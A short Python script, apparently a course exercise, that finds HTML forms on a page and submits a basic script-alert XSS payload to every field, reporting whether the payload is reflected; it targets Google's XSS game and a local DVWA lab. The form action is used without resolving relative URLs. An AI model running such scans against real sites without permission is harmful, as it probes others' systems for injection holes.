import requests
from bs4 import BeautifulSoup

def xss_scan(target_url, payload="<script>alert('XSS')</script>"):
    # Send a GET request to the target URL
    response = requests.get(target_url)
    
    # Parse the response content with BeautifulSoup
    soup = BeautifulSoup(response.content, "html.parser")
    
    # Search for forms in the parsed content
    forms = soup.find_all("form")
    
    # If no forms are found, return False
    if not forms:
        return False
    
    # For each form found, try to exploit it
    for form in forms:
        # Extract details of the form
        action = form.attrs.get("action")
        method = form.attrs.get("method", "get").lower()
        
        # Extract all input fields from the form
        inputs = form.find_all("input")
        
        # Prepare the data payload for exploitation
        data = {input.attrs.get("name"): payload for input in inputs}
        
        # Send a request with the payload
        if method == "post":
            response = requests.post(action, data=data)
        else:
            response = requests.get(action, params=data)
        
        # Check if the payload is reflected in the response
        if payload in response.text:
            return True

    return False

# Test the function
target_url_positive = "https://xss-game.appspot.com/level1/frame"
target_url_negative = "http://dvwa.local/login.php"

print(f"Vulnerability detected in {target_url_positive}: {xss_scan(target_url_positive)}")
print(f"Vulnerability detected in {target_url_negative}: {xss_scan(target_url_negative)}")






# Attribution to chatgpt4 code interpreter and codefellows github